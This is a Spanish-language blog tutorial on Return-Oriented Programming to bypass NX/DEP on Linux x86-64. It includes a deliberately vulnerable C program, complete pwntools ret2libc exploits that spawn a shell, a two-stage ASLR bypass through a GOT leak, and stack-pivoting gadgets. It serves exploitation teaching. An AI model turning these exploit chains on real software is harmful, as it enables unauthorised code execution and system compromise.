---
layout: single
title: "ROP Chains: bypass de NX/DEP sin shellcode"
date: 2026-07-01
categories: [tutoriales]
tags: [exploitation, rop, binary-exploitation, pwn, pwntools, linux]
excerpt: "Return-Oriented Programming permite ejecutar código arbitrario en binarios protegidos por NX/DEP encadenando gadgets existentes en el propio binario."
permalink: /tutoriales/rop-chains-bypass-nx-dep/
---

## El problema con NX/DEP

Antes de que los sistemas operativos implementaran protecciones de memoria, un buffer overflow clásico era trivial: desbordas el buffer, sobreescribes la dirección de retorno con la dirección de tu shellcode en la pila, y ejecutas.

Las protecciones NX (No-Execute en AMD) y DEP (Data Execution Prevention en Windows) rompieron ese modelo: la pila y el heap se marcan como no ejecutables. Intentar saltar a shellcode en la pila resulta en un segmentation fault o una excepción de protección de acceso.

Return-Oriented Programming (ROP) es la respuesta: en lugar de inyectar código, reutilizas fragmentos de código ya presentes en el binario o en las librerías cargadas. Esos fragmentos se llaman **gadgets**.

## Gadgets: el material de construcción

Un gadget ROP es una secuencia de instrucciones que termina en `ret`. Por ejemplo:

```asm
pop rdi
ret
```

O:

```asm
mov rax, [rbx]
ret
```

La clave está en el `ret`: al ejecutarlo, el procesador saca la siguiente dirección de la pila y salta ahí. Si controlas la pila (gracias al overflow), controlas la cadena de ejecución. Encadenas gadget tras gadget para construir lógica arbitraria.

El stack frame de un ataque ROP tiene esta estructura:

```
[dirección del gadget 1]
[valor para el gadget 1]
[dirección del gadget 2]
[valor para el gadget 2]
...
[dirección de la función objetivo]
```

## Ejemplo práctico: ret2libc en Linux x86-64

### El binario vulnerable

```c
#include <stdio.h>
#include <string.h>

void vuln(char *input) {
    char buf[64];
    strcpy(buf, input);
}

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    vuln(argv[1]);
    return 0;
}
```

Compilado sin stack canary pero con NX activo:

```bash
gcc -o target target.c -fno-stack-protector -no-pie -z noexecstack
```

Verificamos las protecciones con `checksec`:

```bash
$ checksec --file=target
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX activo, sin PIE — las direcciones del binario son estáticas, no necesitamos bypassear ASLR por ahora.

### Encontrar el offset hasta RIP

Con `cyclic` de pwntools generamos un patrón de Bruijn para localizar el offset exacto:

```bash
$ python3 -c "from pwn import *; print(cyclic(200).decode())"
aaaabaaacaaadaaaeaaaf...
```

```bash
$ gdb ./target
(gdb) run $(python3 -c "from pwn import *; print(cyclic(200).decode())")
Program received signal SIGSEGV.
(gdb) x/xg $rsp
0x7fffffffe0e8: 0x6161616c6161616b
(gdb) quit

$ python3 -c "from pwn import *; print(cyclic_find(0x6161616c6161616b))"
72
```

Offset confirmado: 72 bytes (64 de buffer + 8 de saved RBP).

### Buscar gadgets con ROPgadget

Para llamar a `system("/bin/sh")` en x86-64, el primer argumento va en `rdi` según la convención System V AMD64. Necesitamos un gadget `pop rdi ; ret`:

```bash
$ ROPgadget --binary target | grep "pop rdi"
0x0000000000401193 : pop rdi ; ret
```

La cadena `/bin/sh` y `system()` viven en libc:

```bash
$ ROPgadget --binary target --string "/bin/sh"
# Si no aparece en el binario, la localizamos en libc directamente
$ python3 -c "
from pwn import *
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print(hex(next(libc.search(b'/bin/sh'))))
print(hex(libc.sym['system']))
"
```

### El exploit

```python
from pwn import *

elf  = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Con ASLR desactivado (sysctl kernel.randomize_va_space=0) para este ejemplo
libc.address = 0x00007ffff7d8a000   # base de libc — ajustar según el sistema

pop_rdi    = 0x401193               # pop rdi ; ret
ret_gadget = 0x40101a               # ret (alineación de stack)
system_addr = libc.sym['system']
binsh_addr  = next(libc.search(b'/bin/sh'))

payload  = b'A' * 72
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret_gadget)          # alineación obligatoria en x86-64 para SSE
payload += p64(system_addr)

p = process(['./target', payload])
p.interactive()
```

El gadget `ret` extra antes de `system()` no es opcional: `system()` usa instrucciones MOVAPS que requieren el stack alineado a 16 bytes. Sin él obtienes SIGSEGV dentro de libc, no en el overflow.

## Herramientas de referencia

| Herramienta | Uso principal |
|-------------|---------------|
| `ROPgadget` | Búsqueda de gadgets, generación automática de cadenas |
| `ropper` | Búsqueda de gadgets con filtros avanzados |
| `pwntools` | Framework de exploits: `p64()`, `cyclic()`, clase `ROP` |
| `pwndbg` / `gef` | Extensiones GDB orientadas a exploits |
| `one_gadget` | Gadgets en libc que ejecutan shell directamente |

`one_gadget` busca en libc gadgets que llaman a `execve("/bin/sh", ...)` sin necesidad de configurar argumentos manualmente:

```bash
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  r10 == NULL || {rdx, ...}
```

Si las constraints se cumplen en el momento del overflow, es el atajo más corto a una shell.

## Cuando ASLR está activo: leak de libc

En un escenario real, ASLR aleatoriza la base de libc en cada ejecución. La solución estándar es un **ret2plt leak**: usas `puts()` o `printf()` para imprimir la dirección de una función en la GOT, calculas el offset hasta la base de libc, y ejecutas la cadena real en un segundo stage.

```python
from pwn import *

elf  = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p    = process('./target')

pop_rdi = 0x401193

# Stage 1: leak de puts@GOT para calcular la base de libc
payload_leak  = b'A' * 72
payload_leak += p64(pop_rdi)
payload_leak += p64(elf.got['puts'])    # puts@GOT — dirección real de puts en libc
payload_leak += p64(elf.plt['puts'])    # puts@PLT — imprime esa dirección
payload_leak += p64(elf.sym['main'])    # volver a main para el segundo stage

p.sendline(payload_leak)
leaked       = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.sym['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: cadena ROP con direcciones reales
system_addr = libc.sym['system']
binsh_addr  = next(libc.search(b'/bin/sh'))

payload_shell  = b'A' * 72
payload_shell += p64(pop_rdi)
payload_shell += p64(binsh_addr)
payload_shell += p64(libc.address + 0x2a3e5)  # ret para alineación
payload_shell += p64(system_addr)

p.sendline(payload_shell)
p.interactive()
```

## Stack pivoting

Cuando el espacio de overflow es limitado y no cabe toda la cadena ROP en la pila original, se usa **stack pivoting**: redirigir `rsp` a una zona de memoria bajo tu control (`.bss`, heap) donde ya tienes la cadena completa precargada.

El gadget más común para pivot:

```asm
leave
ret
```

`leave` equivale a `mov rsp, rbp ; pop rbp`. Si controlas `rbp` mediante el overflow, puedes apuntar `rsp` a cualquier dirección escribible.

Otro gadget útil:

```asm
xchg rax, rsp
ret
```

Si lograste cargar una dirección controlada en `rax` (por ejemplo, con un gadget anterior `pop rax`), intercambias `rax` y `rsp` y el stack se desplaza a tu zona preparada.

## Automatización con pwntools ROP

pwntools incluye una clase `ROP` que construye cadenas automáticamente buscando gadgets en el binario:

```python
from pwn import *

elf = ELF('./target')
rop = ROP(elf)

rop.raw(b'A' * 72)
rop.puts(elf.got['puts'])
rop.main()

print(rop.dump())
# 0x0000:         'AAAA...' padding
# 0x0048:   0x401193 pop rdi; ret
# 0x0050:   0x404018 [got.puts]
# 0x0058:   0x401030 puts
# 0x0060:   0x401166 main
```

No siempre encuentra los gadgets óptimos para secuencias complejas, pero para chains estándar ahorra tiempo.

## Conclusión

ROP convierte la restricción NX/DEP en una limitación superada: en lugar de inyectar código, reutilizas el código del propio binario. La dificultad escala con las protecciones adicionales — ASLR requiere un leak previo, PIE dificulta encontrar gadgets del binario base (pero libc sigue siendo el objetivo principal), y los canarios de stack exigen una primitiva de lectura antes del overflow.

El escalado natural de estas técnicas lleva a **SROP** (Sigreturn-Oriented Programming), útil cuando los gadgets disponibles son tan escasos que no puedes construir una cadena convencional — un único gadget `syscall ; ret` es suficiente para ejecutar `sigreturn` y controlar todos los registros de una vez.

## Referencias

- Phrack #58 — *The advanced return-into-lib(c) exploits* (Nergal, 2001)
- *The Shellcoder's Handbook*, Koziol et al. — explotación de memoria clásica
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) — JonathanSalwan
- [pwntools documentation](https://docs.pwntools.com/)
- [pwn.college](https://pwn.college/) — laboratorios prácticos de explotación binaria
